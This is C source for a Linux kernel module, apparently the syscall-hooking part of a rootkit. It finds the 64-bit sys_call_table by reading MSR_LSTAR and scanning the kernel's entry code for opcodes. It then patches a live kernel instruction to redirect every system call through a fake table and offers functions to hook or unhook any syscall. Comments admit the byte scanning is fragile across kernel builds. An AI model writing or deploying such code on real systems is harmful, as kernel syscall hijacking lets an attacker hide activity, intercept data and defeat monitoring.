#include <linux/kernel.h>
#include <linux/types.h>
#include <linux/string.h>
#include <asm/msr.h>
#include <asm/syscall.h>
#include <asm/paravirt.h>

#include "hook.h"
#include "log.h"
#include "utils.h"
#include "patch.h"
#include "yarrcall.h"

// Our fake sys_call_table.
static unsigned long __fake_sct[__NR_syscall_max+1];
static unsigned long *__sys_call_table;

/**
 * Does all the work needed to locate the 64-bit sys_call_table and hook it
 * with our fake sys_call_table.
 *
 * @return: Zero on success, non-zero elsewhere.
 */
static int __hook_syscall_table_64(void) {
    unsigned char *entry_SYSCALL_64, *do_syscall_64, *addr_e8, *addr_8b;
    int displacement, sct_addr_encoded, i, err;
    unsigned long addr;
    int32_t fake_sct_addr;

    // Get the address of the LSTAR MSR, it contains the entry point of
    // instruction syscall, entry_SYSCALL_64.
    rdmsrl(MSR_LSTAR, addr);
    entry_SYSCALL_64 = (unsigned char *)addr;
    if (entry_SYSCALL_64 == 0) {
        yarr_log("error retrieving MSR_LSTAR address");
        return -1;
    }

    // Look for the first e8 byte. This byte is the opcode for a
    // near/relative call instruction.
    //
    // TODO: This is broken, the kernels I'm working with meet the requirement
    // of the first e8-byte being part of the call instruction that has the
    // address of the next function to look into (do_syscall_64), but if the
    // code changes, the way of building the kernel (optimizations, etc)
    // changes, or anything else provokes the assembler to change then this
    // will fail miserably.
    addr_e8 = lookup_byte(entry_SYSCALL_64, '\xe8', 0);
    if (addr_e8 == NULL) {
        yarr_log("error while looking up call instruction opcode (e8)");
        return -1;
    }

    // Get the 4 bytes next to the call opcode (displacement).
    memcpy(&displacement, (void *)(addr_e8 + 1), 4);

    // Calculate the address of do_syscall_64. The + 5 is because the
    // displacement is relative to the next instruction. The call instruction
    // is 5-byte long, e8 <4-byte displacement>, so the next instruction is
    // in address addr_e8 + 5.
    do_syscall_64 = (void *)(addr_e8 + 5 + displacement);

    // its instructions, specifically mov <num>(,%rdi,8),%rax. Here <num> is
    // the encoded address of the sys_call_table. This instruction in 64-bit
    // code looks like 48 8b 04 fd 00 00 00 00, where the trailing zeroes are
    // <num>. I rather look for the 8b byte (less common), and by the time I
    // was writing this, I'm interested in the third ocurrence.
    //
    // TODO: As with the previous lookup, this is broken if something changes
    // the assembler.
    addr_8b = lookup_byte(do_syscall_64, '\x8b', 2);

    // Get the 4 bytes we are interested in.
    memcpy(&sct_addr_encoded, (void *)(addr_8b + 3), 4);

    // Now we know the address of sys_call_table, back it up for when we
    // unload. We promote first to long so there's sign extension and then to 
    // pointer so we omit a warning.
    __sys_call_table = (void *)(long)sct_addr_encoded;

    // Fulfill our fake sys_call_table with the real syscalls.
    for (i = 0; i < __NR_syscall_max + 1; i++) {
        __fake_sct[i] = __sys_call_table[i];
    }

    // Now we patch the instruction from where we got the sys_call_table
    // with our fake sys_call_table.
    fake_sct_addr = get_low_4_bytes((unsigned long)&__fake_sct);
    err = patch(addr_8b + 3, &(fake_sct_addr), 4);
    if (err) {
        yarr_log("error patching the sys_call_table");
        return -1;
    }

    return 0;
}

int hook_init(void) {
    int err;

    // Hook the 64-bit system call table.
    err = __hook_syscall_table_64();
    if (err) {
        yarr_log("error hooking sys_call_table for 64-bit");
    }

    // TODO: Hook the 32-bit system call table.

    return err;
}

int hook_finish(void) {
    return 0;
}

int install_hook(int n, void *fnc_addr) {
    if (__fake_sct == NULL) {
        yarr_log("Call to syscall hook subsystem before initializing");
        return -1;
    }

    if (n < 0 || n >= __NR_syscall_max + 1) {
        yarr_log("Index %d out of syscall table bounds", n);
        return -1;
    }

    if (fnc_addr == NULL) {
        yarr_log("Hook function is NULL");
        return -1;
    }

    return patch(&__fake_sct[n], &fnc_addr, sizeof(void *));
}

int uninstall_hook(int n) {
    if (__fake_sct == NULL) {
        yarr_log("Call to syscall hook subsystem before initializing");
        return -1;
    }

    if (n < 0 || n >= __NR_syscall_max + 1) {
        yarr_log("Index %d out of syscall table bounds", n);
        return -1;
    }

    return unpatch(&(__fake_sct[n]));
}

void * get_original_syscall_table64(void) {
    return __sys_call_table;
}

